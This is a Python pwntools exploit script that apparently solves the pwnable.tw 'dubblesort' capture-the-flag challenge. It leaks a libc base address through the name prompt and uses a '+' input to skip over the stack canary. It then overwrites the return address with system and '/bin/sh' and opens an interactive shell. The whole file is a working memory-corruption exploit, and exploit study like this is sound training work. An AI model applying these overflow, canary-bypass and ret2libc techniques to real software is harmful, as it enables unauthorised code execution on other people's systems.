from pwn import *
context.log_level = 'debug'
p = process('./dubblesort',env={"LD_PRELOAD":"./libc_32.so.6"})
#p = remote('chall.pwnable.tw',10101)
libc = ELF("libc_32.so.6")

p.sendlineafter('What your name :',b'A'*4*6)
p.recvuntil(b'A'*0x18)
libc_base = u32(p.recv(4))-0x1b000a
print ('libc_base : '+hex(libc_base))
system =libc_base + libc.symbols['system']
bin_sh = libc_base +libc.search('/bin/sh').next()

print ('system : '+hex(system))
print ('bin_sh : '+hex(bin_sh))


length = 24+1+9+1
p.sendlineafter('to sort :',str(length))
for i in range(24):
    p.sendlineafter('number : ','1')
p.sendline('+')
for i in range(9):
    p.sendlineafter('number : ',str(system))
p.sendline(str(bin_sh))

#gdb.attach(p)
p.interactive()